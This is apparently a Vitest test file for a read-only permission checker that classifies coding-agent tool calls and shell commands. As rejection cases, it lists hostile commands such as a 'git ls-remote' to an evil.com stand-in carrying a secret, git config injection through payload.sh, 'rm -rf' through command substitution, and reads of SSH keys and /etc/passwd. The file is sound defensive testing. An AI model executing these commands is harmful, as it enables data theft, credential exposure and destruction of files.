import { describe, it, expect } from 'vitest';
import path from 'node:path';
import { isReadOnlyBashCommand, isReadOnlyToolCall } from './read-only-tools.js';

// Platform-neutral worktree root for path-scoping tests.
const CWD = path.resolve('/work/tree');

describe('isReadOnlyToolCall', () => {
  it('allows pure read tools with worktree-relative paths', () => {
    expect(isReadOnlyToolCall('Read', { file_path: 'src/a.ts' }, CWD)).toBe(true);
    expect(isReadOnlyToolCall('Read', { file_path: path.join(CWD, 'src', 'a.ts') }, CWD)).toBe(true);
    expect(isReadOnlyToolCall('Grep', { pattern: 'x' }, CWD)).toBe(true);
    expect(isReadOnlyToolCall('Grep', { pattern: 'x', path: 'src' }, CWD)).toBe(true);
    expect(isReadOnlyToolCall('Glob', { pattern: '**/*.ts' }, CWD)).toBe(true);
    expect(isReadOnlyToolCall('TodoRead', {}, CWD)).toBe(true);
  });

  it('rejects read tools reaching outside the worktree', () => {
    expect(isReadOnlyToolCall('Read', { file_path: path.resolve('/etc/passwd') }, CWD)).toBe(false);
    expect(isReadOnlyToolCall('Read', { file_path: '../../secrets.txt' }, CWD)).toBe(false);
    expect(isReadOnlyToolCall('Grep', { pattern: 'key', path: path.resolve('/home/user') }, CWD)).toBe(false);
    expect(isReadOnlyToolCall('Glob', { pattern: '*', path: '..' }, CWD)).toBe(false);
    // Without a known cwd, any explicit path prompts.
    expect(isReadOnlyToolCall('Read', { file_path: 'src/a.ts' })).toBe(false);
  });

  it('rejects network-fetch tools (exfiltration channel)', () => {
    expect(isReadOnlyToolCall('WebFetch', { url: 'https://example.com' }, CWD)).toBe(false);
    expect(isReadOnlyToolCall('WebSearch', { query: 'svelte 5 runes' }, CWD)).toBe(false);
  });

  it('rejects mutating tools', () => {
    expect(isReadOnlyToolCall('Edit', {}, CWD)).toBe(false);
    expect(isReadOnlyToolCall('Write', {}, CWD)).toBe(false);
    expect(isReadOnlyToolCall('NotebookEdit', {}, CWD)).toBe(false);
    expect(isReadOnlyToolCall('ExitPlanMode', { plan: 'x' }, CWD)).toBe(false);
    expect(isReadOnlyToolCall('mcp__foo__bar', {}, CWD)).toBe(false);
  });

  it('classifies Bash by its command string', () => {
    expect(isReadOnlyToolCall('Bash', { command: 'git status' }, CWD)).toBe(true);
    expect(isReadOnlyToolCall('Bash', { command: 'git push origin main' }, CWD)).toBe(false);
    expect(isReadOnlyToolCall('Bash', {}, CWD)).toBe(false);
    expect(isReadOnlyToolCall('Bash', { command: 42 }, CWD)).toBe(false);
  });
});

describe('isReadOnlyBashCommand — git', () => {
  it('allows read-only git subcommands', () => {
    for (const cmd of [
      'git status',
      'git log --oneline -20',
      'git log main..dev',
      'git diff HEAD~1',
      'git show abc123',
      'git blame src/a.ts',
      'git rev-parse HEAD',
      'git ls-files',
      'git ls-remote origin',
      'git fetch origin',
      'git reflog',
      'git describe --tags',
      'git -C sub status',
    ]) {
      expect(isReadOnlyBashCommand(cmd, CWD), cmd).toBe(true);
    }
  });

  it('rejects mutating git subcommands', () => {
    for (const cmd of [
      'git push',
      'git push --force origin main',
      'git commit -m "x"',
      'git add .',
      'git checkout -b feat',
      'git merge main',
      'git rebase main',
      'git reset --hard HEAD~1',
      'git clean -fd',
      'git stash',
      'git stash pop',
      'git cherry-pick abc',
      'git worktree add ../x',
      'git remote add origin url',
      'git config user.name foo',
    ]) {
      expect(isReadOnlyBashCommand(cmd, CWD), cmd).toBe(false);
    }
  });

  it('rejects config/exec injection through global options', () => {
    expect(isReadOnlyBashCommand('git -c core.fsmonitor=./payload.sh status', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git -c core.pager=payload log', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git --config-env=core.pager=X status', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git --exec-path=./evil status', CWD)).toBe(false);
  });

  it('rejects exec/write flags on read subcommands', () => {
    expect(isReadOnlyBashCommand('git fetch --upload-pack=./payload.sh origin', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git grep -Opayload pattern', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git grep --open-files-in-pager=payload x', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git log --output=log.txt', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git diff --ext-diff', CWD)).toBe(false);
  });

  it('restricts fetch/ls-remote to configured remote names (no ad-hoc URLs)', () => {
    expect(isReadOnlyBashCommand('git fetch origin main', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git fetch https://evil.com/repo', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git ls-remote https://evil.com/?d=secret', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git fetch git@evil.com:x/y.git', CWD)).toBe(false);
  });

  it('allows list forms of branch/tag but rejects create/delete forms', () => {
    expect(isReadOnlyBashCommand('git branch', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git branch -a', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git branch --list "feat/*"', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git branch new-feature', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git branch -d old', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git branch -m a b', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git tag', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git tag -l "v*"', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git tag v1.0.0', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git tag -d v1.0.0', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git tag -a v1 -m msg', CWD)).toBe(false);
  });

  it('allows read-only remote/stash/config/worktree forms only', () => {
    expect(isReadOnlyBashCommand('git remote -v', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git remote show origin', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git remote set-url origin x', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git stash list', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git config --get user.name', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git worktree list', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git worktree remove x', CWD)).toBe(false);
  });
});

describe('isReadOnlyBashCommand — general commands', () => {
  it('allows plain read commands', () => {
    for (const cmd of ['ls -la', 'cat package.json', 'pwd', 'grep -rn foo src', 'rg "TODO" src', 'wc -l file.txt', 'findstr /s foo *.ts', 'find src -name "*.ts"']) {
      expect(isReadOnlyBashCommand(cmd, CWD), cmd).toBe(true);
    }
  });

  it('rejects mutating or unknown commands', () => {
    for (const cmd of ['rm -rf x', 'del file', 'mv a b', 'cp a b', 'mkdir x', 'touch x', 'npm install', 'npm publish', 'node script.js', 'curl https://x', 'sed -i s/a/b/ f']) {
      expect(isReadOnlyBashCommand(cmd, CWD), cmd).toBe(false);
    }
  });

  it('rejects commands that execute or write through allowlisted names', () => {
    // env CMD executes CMD; awk system() executes; sort -o / tree -o write.
    expect(isReadOnlyBashCommand('env rm -rf x', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('awk \'BEGIN{system("rm -rf x")}\'', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('sort -o out.txt in.txt', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('tree -o out.txt', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('find . -exec rm {} \\;', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('find . -execdir rm {} \\;', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('find . -delete', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('find . -fprintf log %p', CWD)).toBe(false);
  });

  it('rejects reads outside the worktree', () => {
    expect(isReadOnlyBashCommand('cat C:\\Users\\x\\.ssh\\id_rsa', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('cat /c/Users/x/.ssh/id_rsa', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('cat /etc/passwd', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('cat ~/.ssh/id_rsa', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('cat ../../secrets.txt', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('grep key ../other-repo/.env', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('git -C C:\\other\\repo status', CWD)).toBe(false);
    // No cwd known → any absolute path prompts.
    expect(isReadOnlyBashCommand('cat /etc/passwd')).toBe(false);
    // Absolute path inside the worktree stays fine.
    expect(isReadOnlyBashCommand(`cat ${path.join(CWD, 'package.json')}`, CWD)).toBe(true);
  });

  it('allows chains only when every segment is read-only', () => {
    expect(isReadOnlyBashCommand('git status && git log --oneline -5', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git log --oneline | head -5', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('cd src; ls', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('git status && git push', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('ls; rm -rf x', CWD)).toBe(false);
  });

  it('rejects redirection and command substitution wholesale', () => {
    expect(isReadOnlyBashCommand('git log > log.txt', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('echo hi >> file', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('echo $(rm -rf x)', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('echo `rm x`', CWD)).toBe(false);
    // Fail-safe over-rejection: a literal ">" in quotes still prompts.
    expect(isReadOnlyBashCommand('grep ">" file.xml', CWD)).toBe(false);
  });

  it('allows read-only gh and npm forms only', () => {
    expect(isReadOnlyBashCommand('gh pr view 12', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('gh pr list', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('gh issue list', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('gh pr create -t x', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('gh pr merge 12', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('gh api repos/x/y -X DELETE', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('npm ls', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('npm view zod version', CWD)).toBe(true);
    expect(isReadOnlyBashCommand('npm run build', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('node --version', CWD)).toBe(true);
  });

  it('rejects empty or non-string input', () => {
    expect(isReadOnlyBashCommand('', CWD)).toBe(false);
    expect(isReadOnlyBashCommand('   ', CWD)).toBe(false);
  });
});
